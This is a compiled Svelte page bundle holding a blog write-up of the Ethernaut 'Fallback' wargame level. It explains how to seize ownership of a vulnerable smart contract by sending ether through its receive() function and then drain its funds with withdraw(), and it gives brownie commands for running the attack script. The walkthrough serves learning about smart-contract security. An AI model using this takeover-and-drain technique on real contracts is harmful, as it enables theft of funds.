Xp=n(pe);kn=p(Xp,"attack"),Xp.forEach(e),gn=p(T," fn. with 2 parameters "),Fe=o(T,"CODE",{});var Jp=n(Fe);On=p(Jp,"contract_address"),Jp.forEach(e),In=p(T," & with our account (the metamask wallte one). This one will get executed when we test the script on actual testnet for this case on "),ce=o(T,"CODE",{});var Qp=n(ce);Ln=p(Qp,"rinkeby"),Qp.forEach(e),Nn=p(T,"."),T.forEach(e),Gp.forEach(e),Tn=r(h),re=o(h,"LI",{});var sF=n(re);O=o(sF,"P",{});var Y=n(O);xn=p(Y,"Else we’re just calling the "),ie=o(Y,"CODE",{});var lF=n(ie);Pn=p(lF,"attack"),lF.forEach(e),Un=p(Y," fn. & it’ll not be a problem because see the fn. declaraion "),ye=o(Y,"CODE",{});var eF=n(ye);Rn=p(eF,"def attack(contract_address=None, attacker=None)"),eF.forEach(e),jn=p(Y,", the default values are "),de=o(Y,"CODE",{});var aF=n(de);Mn=p(aF,"None"),aF.forEach(e),Sn=p(Y,"."),Y.forEach(e),sF.forEach(e),Wn=r(h),Ee=o(h,"LI",{});var oF=n(Ee);ts=o(oF,"P",{});var Ia=n(ts);Bn=p(Ia,"Moving on, "),De=o(Ia,"CODE",{});var nF=n(De);$n=p(nF,"if contract_address is None:"),nF.forEach(e),Vn=p(Ia," will get executed when we’re testing locally. This one is just setting up the contract address & accounts which we deployed locally."),Ia.forEach(e),oF.forEach(e),Hn=r(h),ve=o(h,"LI",{});var tF=n(ve);fe=o(tF,"P",{});var pF=n(fe);qn=p(pF,"We’re making a contract object by using the interface we created easier & passing the address of our contract to it"),pF.forEach(e),tF.forEach(e),h.forEach(e),pa=r(l),he=f(l,!1),ue=r(l),ps=o(l,"H2",{id:!0});var FF=n(ps);ms=o(FF,"A",{href:!0});var cF=n(ms);Kn=p(cF,"Approach"),cF.forEach(e),FF.forEach(e),Fa=r(l),H=o(l,"OL",{});var La=n(H);Fs=o(La,"LI",{});var Na=n(Fs);_e=o(Na,"P",{});var rF=n(_e);zn=p(rF,"We have to claim the contract i.e. we have to be the owner. For this we have to have contribute more than the owner. Which is a porblem for 2 reasons."),rF.forEach(e),Zn=r(Na),cs=o(Na,"OL",{});var Ta=n(cs);Ae=o(Ta,"LI",{});var iF=n(Ae);Gn=p(iF,"We don’t have that much ether"),iF.forEach(e),Yn=r(Ta),I=o(Ta,"LI",{});var X=n(I);Xn=p(X,"We can’t send more than "),me=o(X,"CODE",{});var yF=n(me);Jn=p(yF,"0.001"),yF.forEach(e),Qn=p(X," because of this line "),we=o(X,"CODE",{});var dF=n(we);st=p(dF,"require(msg.value < 0.001 ether)"),dF.forEach(e),lt=p(X," in "),be=o(X,"CODE",{});var EF=n(be);et=p(EF,"contribute"),EF.forEach(e),at=p(X," fn."),X.forEach(e),Ta.forEach(e),Na.forEach(e),ot=r(La),Ce=o(La,"LI",{});var DF=n(Ce);D=o(DF,"P",{});var b=n(D);nt=p(b,"What can we do here… Interestingly there is a "),ke=o(b,"CODE",{});var vF=n(ke);tt=p(vF,"receive()"),vF.forEach(e),pt=p(b," method which is interesting. This one says that if we make any contribution which is greater than "),ge=o(b,"CODE",{});var fF=n(ge);Ft=p(fF,"0"),fF.forEach(e),ct=p(b," then we’ll be the owner of the contract. But this doesn’t look like a normal fn. It doesn’t have the "),Oe=o(b,"CODE",{});var hF=n(Oe);rt=p(hF,"function"),hF.forEach(e),it=p(b," keyword. If we look at solidity documentation the "),Ie=o(b,"CODE",{});var uF=n(Ie);yt=p(uF,"receive()"),uF.forEach(e),dt=p(b," method is a special method (from solidity 6) that allows a contract to receive payments i.e. ether. Ok coool. More on "),q=o(b,"A",{href:!0,rel:!0,target:!0});var _F=n(q);Et=p(_F,"receive"),_F.forEach(e),Dt=p(b," fn."),b.forEach(e),DF.forEach(e),La.forEach(e),ca=r(l),Le=f(l,!1),Ne=r(l),ws=o(l,"UL",{});var AF=n(ws);Te=o(AF,"LI",{});var mF=n(Te);vt=p(mF,"Let’s attack it now. First we’re sending some ether to this contract."),mF.forEach(e),AF.forEach(e),ra=r(l),xe=f(l,!1),Pe=r(l),bs=o(l,"UL",{});var wF=n(bs);rs=o(wF,"LI",{});var xa=n(rs);ft=p(xa,"Now we’re using the "),Ue=o(xa,"CODE",{});var bF=n(Ue);ht=p(bF,"transfer"),bF.forEach(e),ut=p(xa," functionality of brownie to send the money to the contract."),xa.forEach(e),wF.forEach(e),ia=r(l),Re=f(l,!1),je=r(l),Cs=o(l,"UL",{});var CF=n(Cs);is=o(CF,"LI",{});var Pa=n(is);_t=p(Pa,"By invoking this function we’re matching the require statement in the "),Me=o(Pa,"CODE",{});var kF=n(Me);At=p(kF,"require()"),kF.forEach(e),mt=p(Pa," method of the contract & this will make us the new owner."),Pa.forEach(e),CF.forEach(e),ya=r(l),Se=f(l,!1),We=r(l),ks=o(l,"UL",{});var gF=n(ks);ys=o(gF,"LI",{});var Ua=n(ys);wt=p(Ua,"Now to complete the challenge we have to drain all the funds. It’s easy now as we’re now the owner we cann call the built-in "),Be=o(Ua,"CODE",{});var OF=n(Be);bt=p(OF,"withdraw()"),OF.forEach(e),Ct=p(Ua," function."),Ua.forEach(e),gF.forEach(e),da=r(l),ds=o(l,"H2",{id:!0});var IF=n(ds);gs=o(IF,"A",{href:!0});var LF=n(gs);kt=p(LF,"Using Brownie to run the program"),LF.forEach(e),IF.forEach(e),Ea=r(l),Os=o(l,"UL",{});var NF=n(Os);$e=o(NF,"LI",{});var TF=n($e);gt=p(TF,"To run on local development environment. This will compile all the nesessary files & run the attack script."),TF.forEach(e),NF.forEach(e),Da=r(l),Ve=f(l,!1),He=r(l),Is=o(l,"P",{});var xF=n(Is);$F(Es.$$.fragment,xF),xF.forEach(e),va=r(l),Ls=o(l,"UL",{});var PF=n(Ls);K=o(PF,"LI",{});var Xe=n(K);Ot=p(Xe,"To run on "),qe=o(Xe,"CODE",{});var UF=n(qe);It=p(UF,"rikeby"),UF.forEach(e),Lt=p(Xe," network use this command. Syntax is "),Ke=o(Xe,"CODE",{});var RF=n(Ke);Nt=p(RF,"brownie run <script.py> <function name> <contract address> --network rikeby"),RF.forEach(e),Xe.forEach(e),PF.forEach(e),fa=r(l),ze=f(l,!1),Ze=SF(),this.h()},h(){zs.a=Zs,M(_s,"href","#solution"),M(ls,"id","solution"),Ys.a=Xs,tl.a=pl,il.a=yl,ul.a=_l,bl.a=Cl,Sl.a=Wl,Gl.a=Yl,he.a=ue,M(ms,"href","#approach"),M(ps,"id","approach"),M(q,"href","https://www.educative.io/answers/how-to-receive-ethers-inside-a-smart-contract"),M(q,"rel","nofollow noopener noreferrer external"),M(q,"target","_blank"),Le.a=Ne,xe.a=Pe,Re.a=je,Se.a=We,M(gs,"href","#using-brownie-to-run-the-program"),M(ds,"id","using-brownie-to-run-the-program"),Ve.a=He,ze.a=Ze},m(l,F){i(l,y,F),s(y,_),s(_,A),s(A,x),s(x,d),s(A,C),s(y,vs),s(y,J),s(J,fs),s(fs,Rs),s(Rs,Ra),s(fs,ja),s(J,Ma),s(J,Q),s(Q,js),s(js,Sa),s(Q,Wa),s(Q,hs),s(hs,Ba),s(hs,Ms),s(Ms,$a),s(y,Va),s(y,ss),s(ss,us),s(us,Ss),s(Ss,Ha),s(us,qa),s(ss,Ka),s(ss,k),s(k,Ws),s(Ws,za),s(k,Za),s(k,Bs),s(Bs,Ga),s(k,Ya),s(k,$s),s($s,Xa),s(k,Ja),s(k,Vs),s(Vs,Qa),s(y,so),s(y,Hs),s(Hs,qs),s(qs,Ks),s(Ks,lo),i(l,Je,F),zs.m(zF,l,F),i(l,Zs,F),i(l,ls,F),s(ls,_s),s(_s,eo),i(l,Qe,F),i(l,As,F),s(As,Gs),s(Gs,ao),i(l,sa,F),Ys.m(ZF,l,F),i(l,Xs,F),i(l,L,F),s(L,Js),s(Js,es),s(es,oo),s(es,Qs),s(Qs,no),s(es,to),s(L,po),s(L,sl),s(sl,P),s(P,Fo),s(P,ll),s(ll,co),s(P,ro),s(P,el),s(el,io),s(P,yo),s(L,Eo),s(L,al),s(al,ol),s(ol,nl),s(nl,Do),i(l,la,F),tl.m(GF,l,F),i(l,pl,F),i(l,S,F),s(S,as),s(as,vo),s(as,Fl),s(Fl,fo),s(as,ho),s(S,uo),s(S,cl),s(cl,rl),s(rl,_o),i(l,ea,F),il.m(YF,l,F),i(l,yl,F),i(l,W,F),s(W,dl),s(dl,U),s(U,Ao),s(U,El),s(El,mo),s(U,wo),s(U,Dl),s(Dl,bo),s(U,Co),s(W,ko),s(W,vl),s(vl,B),s(B,fl),s(fl,go),s(B,Oo),s(B,hl),s(hl,Io),s(B,Lo),i(l,aa,F),ul.m(XF,l,F),i(l,_l,F),i(l,$,F),s($,os),s(os,No),s(os,Al),s(Al,To),s(os,xo),s($,Po),s($,ml),s(ml,wl),s(wl,Uo),i(l,oa,F),bl.m(JF,l,F),i(l,Cl,F),i(l,m,F),s(m,kl),s(kl,V),s(V,gl),s(gl,Ro),s(V,jo),s(V,Ol),s(Ol,Mo),s(V,So),s(m,Wo),s(m,Il),s(Il,w),s(w,Ll),s(Ll,Bo),s(w,$o),s(w,Nl),s(Nl,Vo),s(w,Ho),s(w,Tl),s(Tl,qo),s(w,Ko),s(w,xl),s(xl,zo),s(w,Zo),s(m,Go),s(m,Pl),s(Pl,Ul),s(Ul,Yo),s(m,Xo),s(m,Rl),s(Rl,jl),s(jl,Ml),s(Ml,Jo),i(l,na,F),Sl.m(QF,l,F),i(l,Wl,F),i(l,N,F),s(N,Bl),s(Bl,R),s(R,Qo),s(R,$l),s($l,sn),s(R,ln),s(R,Vl),s(Vl,en),s(R,an),s(N,on),s(N,Hl),s(Hl,ql),s(ql,nn),s(N,tn),s(N,Kl),s(Kl,zl),s(zl,Zl),s(Zl,pn),i(l,ta,F),Gl.m(sc,l,F),i(l,Yl,F),i(l,E,F),s(E,Xl),s(Xl,ns),s(ns,Fn),s(ns,Jl),s(Jl,cn),s(ns,rn),s(E,yn),s(E,Ql),s(Ql,se),s(se,dn),s(E,En),s(E,le),s(le,g),s(g,Dn),s(g,ee),s(ee,vn),s(g,fn),s(g,ae),s(ae,hn),s(g,un),s(g,oe),s(oe,_n),s(g,An),s(E,mn),s(E,ne),s(ne,u),s(u,wn),s(u,te),s(te,bn),s(u,Cn),s(u,pe),s(pe,kn),s(u,gn),s(u,Fe),s(Fe,On),s(u,In),s(u,ce),s(ce,Ln),s(u,Nn),s(E,Tn),s(E,re),s(re,O),s(O,xn),s(O,ie),s(ie,Pn),s(O,Un),s(O,ye),s(ye,Rn),s(O,jn),s(O,de),s(de,Mn),s(O,Sn),s(E,Wn),s(E,Ee),s(Ee,ts),s(ts,Bn),s(ts,De),s(De,$n),s(ts,Vn),s(E,Hn),s(E,ve),s(ve,fe),s(fe,qn),i(l,pa,F),he.m(lc,l,F),i(l,ue,F),i(l,ps,F),s(ps,ms),s(ms,Kn),i(l,Fa,F),i(l,H,F),s(H,Fs),s(Fs,_e),s(_e,zn),s(Fs,Zn),s(Fs,cs),s(cs,Ae),s(Ae,Gn),s(cs,Yn),s(cs,I),s(I,Xn),s(I,me),s(me,Jn),s(I,Qn),s(I,we),s(we,st),s(I,lt),s(I,be),s(be,et),s(I,at),s(H,ot),s(H,Ce),s(Ce,D),s(D,nt),s(D,ke),s(ke,tt),s(D,pt),s(D,ge),s(ge,Ft),s(D,ct),s(D,Oe),s(Oe,rt),s(D,it),s(D,Ie),s(Ie,yt),s(D,dt),s(D,q),s(q,Et),s(D,Dt),i(l,ca,F),Le.m(ec,l,F),i(l,Ne,F),i(l,ws,F),s(ws,Te),s(Te,vt),i(l,ra,F),xe.m(ac,l,F),i(l,Pe,F),i(l,bs,F),s(bs,rs),s(rs,ft),s(rs,Ue),s(Ue,ht),s(rs,ut),i(l,ia,F),Re.m(oc,l,F),i(l,je,F),i(l,Cs,F),s(Cs,is),s(is,_t),s(is,Me),s(Me,At),s(is,mt),i(l,ya,F),Se.m(nc,l,F),i(l,We,F),i(l,ks,F),s(ks,ys),s(ys,wt),s(ys,Be),s(Be,bt),s(ys,Ct),i(l,da,F),i(l,ds,F),s(ds,gs),s(gs,kt),i(l,Ea,F),i(l,Os,F),s(Os,$e),s($e,gt),i(l,Da,F),Ve.m(tc,l,F),i(l,He,F),i(l,Is,F),VF(Es,Is,null),i(l,va,F),i(l,Ls,F),s(Ls,K),s(K,Ot),s(K,qe),s(qe,It),s(K,Lt),s(K,Ke),s(Ke,Nt),i(l,fa,F),ze.m(pc,l,F),i(l,Ze,F),ha=!0},p:yc,i(l){ha||(HF(Es.$$.fragment,l),ha=!0)},o(l){qF(Es.$$.fragment,l),ha=!1},d(l){l&&e(y),l&&e(Je),l&&zs.d(),l&&e(Zs),l&&e(ls),l&&e(Qe),l&&e(As),l&&e(sa),l&&Ys.d(),l&&e(Xs),l&&e(L),l&&e(la),l&&tl.d(),l&&e(pl),l&&e(S),l&&e(ea),l&&il.d(),l&&e(yl),l&&e(W),l&&e(aa),l&&ul.d(),l&&e(_l),l&&e($),l&&e(oa),l&&bl.d(),l&&e(Cl),l&&e(m),l&&e(na),l&&Sl.d(),l&&e(Wl),l&&e(N),l&&e(ta),l&&Gl.d(),l&&e(Yl),l&&e(E),l&&e(pa),l&&he.d(),l&&e(ue),l&&e(ps),l&&e(Fa),l&&e(H),l&&e(ca),l&&Le.d(),l&&e(Ne),l&&e(ws),l&&e(ra),l&&xe.d(),l&&e(Pe),l&&e(bs),l&&e(ia),l&&Re.d(),l&&e(je),l&&e(Cs),l&&e(ya),l&&Se.d(),l&&e(We),l&&e(ks),l&&e(da),l&&e(ds),l&&e(Ea),l&&e(Os),l&&e(Da),l&&Ve.d(),l&&e(He),l&&e(Is),KF(Es),l&&e(va),l&&e(Ls),l&&e(fa),l&&e(Ze),l&&ze.d()}}}function vc(Ds){let y,_;const A=[Ds[0],WF];let x={$$slots:{default:[Dc]},$$scope:{ctx:Ds}};for(let d=0;d<A.length;d+=1)x=Rt(x,A[d]);return y=new dc({props:x}),{c(){BF(y.$$.fragment)},l(d){$F(y.$$.fragment,d)},m(d,C){VF(y,d,C),_=!0},p(d,[C]){const vs=C&1?ic(A,[C&1&&jF(d[0]),C&0&&jF(WF)]):{};C&2&&(vs.$$scope={dirty:C,ctx:d}),y.$set(vs)},i(d){_||(HF(y.$$.fragment,d),_=!0)},o(d){qF(y.$$.fragment,d),_=!1},d(d){KF(y,d)}}}const WF={title:"Ethernaut Fallback",image:"https://ethernaut.openzeppelin.com/imgs/BigLevel1.svg",created:"2022-08-17T00:00:00.000Z",updated:"2022-12-19T00:00:00.000Z",tags:["smart contracts","web3","brownie","ethernaut"],flags:[],slug:"/Ethernaut/Fallback/+page.svelte.md",path:"/Ethernaut/Fallback",toc:[{depth:2,title:"Solution",slug:"solution"},{depth:2,title:"Approach",slug:"approach"},{depth:2,title:"Using Brownie to run the program",slug:"using-brownie-to-run-the-program"}]};function fc(Ds,y,_){return Ds.$$set=A=>{_(0,y=Rt(Rt({},y),MF(A)))},y=MF(y),[y]}class Ac extends Fc{constructor(y){super(),cc(this,y,fc,vc,rc,{})}}export{Ac as default,WF as metadata};
